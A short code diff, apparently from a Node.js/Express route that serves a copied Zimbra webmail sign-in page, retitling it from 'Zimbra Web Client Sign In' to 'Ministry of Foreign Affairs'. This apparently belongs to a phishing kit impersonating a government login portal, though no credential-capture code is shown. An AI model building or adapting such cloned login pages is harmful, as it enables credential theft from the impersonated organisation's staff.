@@ -31,7 +31,7 @@ router.get('/', (req, res) => {
 	<meta name="apple-mobile-web-app-status-bar-style" content="black">
 	<link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
 	<link rel="SHORTCUT ICON" href="/images/favicon.ico">
-    <title>Zimbra Web Client Sign In</title>
+    <title>Ministry of Foreign Affairs</title>
 
 	
         </head>
